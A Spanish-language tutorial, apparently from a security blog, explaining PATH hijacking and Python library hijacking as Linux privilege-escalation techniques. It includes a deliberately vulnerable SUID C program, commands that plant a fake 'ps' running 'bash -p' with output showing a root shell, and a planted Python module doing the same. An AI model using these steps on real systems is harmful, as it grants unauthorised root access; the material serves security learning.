**¿Qué es el PATH Hijacking?**
Empecemos con el PATH es una variable de entorno el cual tiene rutas del sistema, esto para que es?
Esto nos ayuda a identificar los comando, es decir que si nosotros colocamos `nmap` en un CLI buscara este binario en las rutas que tiene establecidas en el PATH.

``` bash
❯ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/home/s4tisfacti0n/.fzf/bin
```

Aunque solo se hace uso del PATH cuando se ejecutan rutas relativas.

``` bash
❯ whoami
s4tisfacti0n

❯ /bin/whoami
s4tisfacti0n
```

En el primer comando se utiliza el PATH para buscar el binario, pero en el segundo no hace falta ya que referenciamos la ubicación exacta de donde se encuentra este, *por lo tanto así podemos evitar ataques como path hijacking*.

Ahora este ataque consiste en modificar el PATH para apuntar a otro archivo de formar que no responda el binario legitimo.

En este caso explotaremos de un script con permisos SUID, empezaremos con un pequeño script en C que muestre los procesos que se estén ejecutando, esto lo podemos ver con la utilidad de *ps*.

``` c
#include <stdio.h>

void main(){
	//Para indicar que este script en c es SUID tenemos que indicar setiuid(0) + el chmod +s
	//Es como una doble verificacion
	setuid(0);

	printf("\n\n[*] Listando procesos con (/urs/bin/ps):\n\n");
	system("/usr/bin/ps");

	printf("\n\n[*] Listando procesos con (ps):\n\n");
	system("ps");
}
```

Este script se tiene que exportar en binario para poder ejecutarse

	gcc process.c -o process

Ahora la intención es crear un archivo *ps* en la ruta actual y modificar el PATH para *indicar la ruta de nuestro archivo ps*.
Añadimos la ruta actual al PATH

``` bash
❯ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/home/s4tisfacti0n/.fzf/bin

❯ export PATH=.:$PATH

❯ echo $PATH
.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/home/s4tisfacti0n/.fzf/bin
```

Creamos el archivo *ps*
``` bash
❯ echo 'bash -p' > ps

❯ chmod +x ps
```

y ejecutamos el `process` desde un usuario no privilegiado
``` bash
❯ ./process


[*] Listando procesos con (/urs/bin/ps):

    PID TTY          TIME CMD
  10801 pts/1    00:00:10 zsh
 103431 pts/1    00:00:00 process
 103432 pts/1    00:00:00 sh
 103433 pts/1    00:00:00 ps


[*] Listando procesos con (ps):

bash-5.2# whoami
root
bash-5.2# 
```

*Nota:* Los cambios en PATH son temporales es decir que se eliminan al terminar la sesión.

**¿Que es el Library Hijacking?**
Esto viene siendo la misma dinámica que el PATH Hijacking pero apuntado a las librerías, supongamos que tenemos un script en python que realiza una peticion *GET* a una pagina y nos devuelve un *codigo de respuesta*.

``` python
#!/usr/bin/python3

import requests

response = requests.get('https://github.com')
print(response)

#Output
<Response [200]>
```

Para visualizar el PATH que sigue python lo podemos hacer con *sys*

``` bash
❯ python3 -c "import sys ; print(sys.path)"
['', '/usr/lib/python310.zip', '/usr/lib/python3.10', '/usr/lib/python3.10/lib-dynload', '/home/s4tisfacti0n/.local/lib/python3.10/site-packages', '/usr/local/lib/python3.10/dist-packages', '/usr/lib/python3/dist-packages']
```
Como podemos ver la primera ruta en buscar es ' ', es decir la ruta actual.
Por lo tanto creamos un archivo `request.py` en la ruta actual.

``` python
#!/usr/bin/python3

import os
os.system('bash -p')
```

Ahora si bien no podemos asignarle permisos [SUID a python](https://stackoverflow.com/questions/25001206/suid-doesnt-work-in-bash), pero podemos abusar de un *sudo*.




